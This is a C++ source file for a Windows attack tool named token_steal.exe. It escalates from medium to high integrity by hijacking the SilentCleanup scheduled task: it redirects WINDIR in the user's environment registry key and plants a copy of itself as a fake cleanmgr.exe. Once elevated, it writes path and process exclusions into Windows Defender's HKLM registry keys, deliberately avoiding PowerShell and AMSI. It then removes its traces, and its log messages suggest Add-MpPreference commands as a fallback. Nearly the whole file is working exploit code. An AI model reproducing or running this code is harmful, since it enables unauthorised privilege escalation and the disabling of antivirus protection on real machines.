/*
    Elevation via Scheduled Task -> Direct HKLM Registry Write

    Two-phase execution:
      Phase 1 (Medium integrity): Use schtasks.exe to schedule THIS binary
                                   to rerun at High integrity (/rl highest)
      Phase 2 (High integrity):   Binary detects /elevated flag,
                                   writes directly to HKLM Defender exclusions
                                   (no PowerShell, no AMSI)

    Compile:
      cl.exe token_steal.cpp /EHsc /link advapi32.lib shell32.lib /out:token_steal.exe
*/

#include <windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <shellapi.h>
#include <stdio.h>
#include <string>
#include <ctime>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// ─── Logging ─────────────────────────────────────────────────────────────────

FILE* gLog = nullptr;

void InitLog(const char* path) {
    gLog = fopen(path, "w");
    if (!gLog) printf("[!] Could not open log: %s\n", path);
}

void Log(const char* lvl, const char* fmt, ...) {
    char buf[2048];
    va_list a; va_start(a, fmt);
    vsnprintf(buf, sizeof(buf), fmt, a);
    va_end(a);
    time_t t = time(nullptr);
    struct tm* ti = localtime(&t);
    char ts[32]; strftime(ts, sizeof(ts), "%H:%M:%S", ti);
    printf("[%s] [%s] %s\n", ts, lvl, buf); fflush(stdout);
    if (gLog) { fprintf(gLog, "[%s] [%s] %s\n", ts, lvl, buf); fflush(gLog); }
}

#define INFO(f,...) Log("INFO ", f, ##__VA_ARGS__)
#define OK(f,...)   Log("OK   ", f, ##__VA_ARGS__)
#define WARN(f,...) Log("WARN ", f, ##__VA_ARGS__)
#define ERR(f,...)  Log("ERROR", f, ##__VA_ARGS__)
#define DBG(f,...)  Log("DEBUG", f, ##__VA_ARGS__)

void WinErr(const char* ctx) {
    DWORD e = GetLastError();
    char m[512]={};
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
                   nullptr,e,0,m,sizeof(m),nullptr);
    for(int i=(int)strlen(m)-1;i>=0&&(m[i]=='\r'||m[i]=='\n');i--) m[i]=0;
    ERR("%s failed — %lu: %s", ctx, e, m);
}

// ─── Integrity helpers ────────────────────────────────────────────────────────

DWORD GetTokenIntegrity(HANDLE hToken) {
    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &dwLen);
    if (!dwLen) return 0;
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLen);
    if (!pTIL) return 0;
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLen, &dwLen)) {
        LocalFree(pTIL); return 0;
    }
    DWORD level = *GetSidSubAuthority(pTIL->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
    LocalFree(pTIL);
    return level;
}

const char* IntegrityName(DWORD l) {
    if (l < 0x1000) return "Untrusted";
    if (l < 0x2000) return "Low";
    if (l < 0x3000) return "Medium";
    if (l < 0x4000) return "High";
    return "System";
}

DWORD MyIntegrity() {
    HANDLE h = nullptr;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h);
    DWORD lvl = GetTokenIntegrity(h);
    if (h) CloseHandle(h);
    return lvl;
}

// ─── Phase 2: Write exclusions directly to HKLM (no PowerShell/AMSI) ─────────

bool WriteExclusionsDirect() {
    INFO("=== Phase 2: Writing exclusions directly to HKLM ===");
    DWORD lvl = MyIntegrity();
    INFO("Integrity: 0x%04lX (%s)", lvl, IntegrityName(lvl));

    if (lvl < 0x3000) {
        ERR("Not at High integrity — scheduled task elevation may have failed");
        return false;
    }
    OK("High integrity confirmed — writing to HKLM...");

    const char* paths[] = {
        "C:\\Users\\Public",
        "C:\\exclusiontest",
    };
    const char* keyPath = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";

    HKEY hKey = nullptr;
    LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS) {
        // Try creating it
        res = RegCreateKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, nullptr,
                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                              nullptr, &hKey, nullptr);
    }
    if (res != ERROR_SUCCESS) {
        ERR("RegOpenKeyEx/Create HKLM Defender Paths: %ld", res);
        return false;
    }

    bool allOk = true;
    for (const char* p : paths) {
        DWORD val = 0;
        LONG r = RegSetValueExA(hKey, p, 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
        if (r == ERROR_SUCCESS)
            OK("Exclusion added: %s", p);
        else {
            ERR("RegSetValueEx for %s: %ld", p, r);
            allOk = false;
        }
    }
    RegCloseKey(hKey);

    // Also add process exclusion via Processes key
    HKEY hProcKey = nullptr;
    res = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes",
        0, KEY_SET_VALUE, &hProcKey);
    if (res == ERROR_SUCCESS) {
        DWORD val = 0;
        RegSetValueExA(hProcKey, "token_steal.exe", 0, REG_DWORD,
                       (const BYTE*)&val, sizeof(val));
        RegCloseKey(hProcKey);
        OK("Process exclusion added: token_steal.exe");
    }

    if (allOk) {
        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "w");
        if (f) { fprintf(f, "success-direct-registry\n"); fclose(f); }
        OK("SUCCESS — exclusions written to HKLM Defender registry!");
        OK("Verify: Get-MpPreference | Select ExclusionPath");
    }
    return allOk;
}

// ─── Phase 1: SilentCleanup WINDIR hijack ────────────────────────────────────
//
// The \Microsoft\Windows\DiskCleanup\SilentCleanup task:
//   - Runs at High integrity (RunLevel = Highest) — auto-elevates for admins
//   - ANY user can trigger it (no elevation needed to /run it)
//   - Executes %WINDIR%\system32\cleanmgr.exe
//   - Reads %WINDIR% from HKCU\Environment (writable by any user!)
//
// We set WINDIR in HKCU\Environment, drop our binary as cleanmgr.exe,
// trigger the task, and our binary runs at High integrity then writes HKLM.

bool ElevateViaSilentCleanup(const char* myExePath) {
    INFO("=== Phase 1: SilentCleanup WINDIR hijack ===");
    INFO("Task: \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
    INFO("Runs at High integrity, triggered by any user, uses HKCU WINDIR");

    // 1. Create fake %WINDIR%\system32 and drop ourselves as cleanmgr.exe
    INFO("Creating C:\\exclusiontest\\system32\\...");
    CreateDirectoryA("C:\\exclusiontest\\system32", nullptr);

    const char* fakeMgr = "C:\\exclusiontest\\system32\\cleanmgr.exe";
    INFO("Copying self to %s", fakeMgr);
    if (!CopyFileA(myExePath, fakeMgr, FALSE)) {
        WinErr("CopyFile -> cleanmgr.exe");
        return false;
    }
    OK("Fake cleanmgr.exe ready");

    // 2. Set HKCU\Environment\WINDIR = C:\exclusiontest
    HKEY hEnv = nullptr;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Environment",
                             0, KEY_QUERY_VALUE|KEY_SET_VALUE, &hEnv);
    if (res != ERROR_SUCCESS) { WinErr("RegOpenKeyEx HKCU\\Environment"); return false; }

    // Save old value if present
    char oldVal[MAX_PATH] = {};
    DWORD oldLen = sizeof(oldVal), oldType = 0;
    bool hadOld = (RegQueryValueExA(hEnv, "WINDIR", nullptr, &oldType,
                                    (BYTE*)oldVal, &oldLen) == ERROR_SUCCESS);

    const char* fakeWinDir = "C:\\exclusiontest";
    res = RegSetValueExA(hEnv, "WINDIR", 0, REG_SZ,
                         (const BYTE*)fakeWinDir, (DWORD)strlen(fakeWinDir)+1);
    if (res != ERROR_SUCCESS) {
        ERR("RegSetValueEx WINDIR: %ld", res); RegCloseKey(hEnv); return false;
    }
    OK("HKCU\\Environment\\WINDIR = %s", fakeWinDir);

    // Broadcast env change so task scheduler picks it up
    SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                        (LPARAM)"Environment", SMTO_ABORTIFHUNG, 500, nullptr);
    Sleep(300);

    // 3. Trigger the SilentCleanup task — any user can do this
    INFO("Triggering SilentCleanup...");
    int r = system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\"");
    DBG("schtasks /run returned: %d", r);
    if (r != 0) WARN("schtasks returned non-zero (may still work)");

    INFO("Waiting 8s for elevated Phase 2 to complete...");
    Sleep(8000);

    // 4. Restore WINDIR
    INFO("Restoring HKCU\\Environment...");
    if (hadOld)
        RegSetValueExA(hEnv, "WINDIR", 0, oldType, (BYTE*)oldVal, oldLen);
    else
        RegDeleteValueA(hEnv, "WINDIR");
    RegCloseKey(hEnv);
    SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                        (LPARAM)"Environment", SMTO_ABORTIFHUNG, 500, nullptr);

    // Cleanup
    DeleteFileA(fakeMgr);
    RemoveDirectoryA("C:\\exclusiontest\\system32");
    DBG("Cleaned up fake cleanmgr.exe");

    // 5. Check result
    FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
    if (f) {
        char buf[256]={};
        fgets(buf, sizeof(buf), f);
        fclose(f);
        OK("Phase 2 result: %s", buf);
        OK("SUCCESS — HKLM exclusions written via SilentCleanup hijack!");
        OK("Verify: Get-MpPreference | Select ExclusionPath");
        return true;
    }

    WARN("No result file — Phase 2 may have been blocked");
    WARN("Check elevated log: C:\\exclusiontest\\token_log_elevated.txt");
    INFO("If Defender blocked cleanmgr.exe, add C:\\exclusiontest\\system32 to exclusions first");
    return false;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    // Phase 2: running elevated via scheduled task
    if (argc > 1 && _stricmp(argv[1], "/elevated") == 0) {
        InitLog("C:\\exclusiontest\\token_log_elevated.txt");
        INFO("=== token_steal.exe (Phase 2 / Elevated) ===");
        bool ok = WriteExclusionsDirect();
        if (gLog) fclose(gLog);
        return ok ? 0 : 1;
    }

    // Phase 1: normal launch at Medium integrity
    InitLog("C:\\exclusiontest\\token_log.txt");
    INFO("=== token_steal.exe (Phase 1) ===");

    DWORD lvl = MyIntegrity();
    INFO("Current integrity: 0x%04lX (%s)", lvl, IntegrityName(lvl));

    // If already elevated (e.g. run from admin prompt), just write directly
    if (lvl >= 0x3000) {
        OK("Already at High integrity — skipping schtasks, writing directly");
        WriteExclusionsDirect();
        goto done;
    }

    INFO("Medium integrity — will use schtasks to self-elevate");
    {
        char myPath[MAX_PATH] = {};
        GetModuleFileNameA(nullptr, myPath, MAX_PATH);
        INFO("Our path: %s", myPath);

        if (!ElevateViaSilentCleanup(myPath)) {
            ERR("SilentCleanup hijack failed");
            INFO("Manual option: right-click token_steal.exe -> Run as administrator");
            INFO("Or open elevated PowerShell and run:");
            INFO("  Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force");
            INFO("  Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force");
        }
    }

done:
    INFO("Log: C:\\exclusiontest\\token_log.txt");
    if (gLog) fclose(gLog);
    printf("\nPress Enter to exit...\n");
    getchar();
    return 0;
}
